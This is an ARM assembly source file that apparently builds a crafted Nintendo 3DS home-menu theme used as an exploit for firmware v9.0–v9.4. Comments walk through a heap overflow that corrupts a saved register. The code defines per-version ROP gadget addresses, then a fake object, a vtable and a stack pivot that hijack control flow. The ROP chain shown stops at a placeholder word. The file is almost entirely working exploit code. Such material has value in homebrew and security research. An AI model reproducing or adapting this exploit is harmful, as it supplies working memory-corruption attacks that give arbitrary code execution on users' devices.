.arm
.section .init
.global _start

@ This is the start of the decompressed theme data.

/*
All function addresses referenced here are for v9.4 homemenu.

The memchunkhax(triggered by the buf overflow + memfree) triggers overwriting the saved r4 on the L_22fb34 stackframe, with value=<address of the below object label>. This is the function which called the memfree function.
After calling some func which decreases some counter, homemenu then executes L_1ca5d0(r4), where r4 is the above overwritten ptr.
L_1ca5d0: This first writes u8 value 1 to 0x3b7e. After checking/using other state, this function eventually executes: L_1d1ea8(*(inr0+0x3a60), 1);//where inr0=above ptr
L_1d1ea8: After using other state, it executes: return L_2441a0(*(inr0+0x2f0), inr1);
L_2441a0: L_1e95e0(*(inr0+4)); ...
L_1e95e0: objectptr = *(inr0+0x28); if(objectptr)<calls vtable funcptr +8 from objectptr> ...//This is where this haxx finally gets control over an objectptr(r0) + PC at the same time.
*/

#define HEAPBUF 0x35052080

#define STACKPIVOT_ADR 0x00100fdc //7814bd30 ldmdavc r4, {r4, r5, r8, sl, fp, ip, sp, pc} (same addr for v9.1j - v9.4 all regions)
#define ROP_LOADR4_FROMOBJR0 0x10b574 //Addr for v9.3-v9.4 is 0x10b574, 0x10b64c for older versions. load r4 from r0+16, return if r4==r5. obj/r0 = r4-32. call vtable funcptr +12 from this obj.
#define ROP_POPPC 0x10203c //Addr for v9.3-v9.4 is 0x10203c, 0x102028 for older versions.

@ The below addrs are for v9.3-v9.4.
#define POP_R0PC 0x00154f0c

#define ROP_LDRR1R1_STRR1R0 0x002003bc
#define ROP_MOVR1R3_BXIP 0x001c2e24
#define MEMCPY 0x00150940

#define SVCSLEEPTHREAD 0x0012b590

#define SRV_GETSERVICEHANDLE 0x0022470c //For v9.3 this addr is 0x0022472c.

#define GXLOW_CMD4 0x0014ac9c

/*
@ These addrs are for v9.2.
#define POP_R0PC 0x001575ac

#define ROP_LDRR1R1_STRR1R0 0x001f1e7c
#define ROP_MOVR1R3_BXIP 0x001b8708
#define MEMCPY 0x001536f8

#define SVCSLEEPTHREAD 0x0012e64c

#define SRV_GETSERVICEHANDLE 0x00212de0

#define GXLOW_CMD4 0x0014d65c
*/

/*
@ These addrs are for v9.0 / v9.1j.
#define POP_R0PC 0x00157554

#define ROP_LDRR1R1_STRR1R0 0x001f1ee4
#define ROP_MOVR1R3_BXIP 0x001b8848
#define MEMCPY 0x001536a0

#define SVCSLEEPTHREAD 0x0012e64c

#define SRV_GETSERVICEHANDLE 0x00212e48

#define GXLOW_CMD4 0x0014d604
*/

_start:

themeheader:
.word 1 @ version

.space ((themeheader + 0xc4) - .)

object:
.word HEAPBUF + (vtable - _start) @ object+0, vtable ptr
.word HEAPBUF + (object - _start) @ Ptr loaded by L_2441a0, passed to L_1e95e0 inr0.
.word 0 @ Memchunk-hdr stuff writes here.
.word 0

.word HEAPBUF + ((object + 0x20) - _start) @ This .word is at object+0x10. ROP_LOADR4_FROMOBJR0 loads r4 from here.

.space ((object + 0x1c) - .) @ sp/pc data loaded by STACKPIVOT_ADR.
.word HEAPBUF + (ropstackstart - _start) @ sp
.word ROP_POPPC @ pc

.space ((object + 0x28) - .)
.word HEAPBUF + (object - _start) @ Actual object-ptr loaded by L_1e95e0, used for the vtable functr +8 call.

.space ((object + 0x2f0) - .)
.word HEAPBUF + (object - _start) @ Ptr loaded by L_1d1ea8, passed to L_2441a0 inr0.

.space ((object + 0x3a60) - .)
.word HEAPBUF + (object - _start) @ Ptr loaded by L_1ca5d0, passed to L_1d1ea8() inr0.

vtable:
.word 0, 0 @ vtable+0
.word ROP_LOADR4_FROMOBJR0 @ vtable funcptr +8
.word STACKPIVOT_ADR @ vtable funcptr +12, called via ROP_LOADR4_FROMOBJR0.

.space ((vtable + 0x100) - .)

ropstackstart:
.word 0x58584148

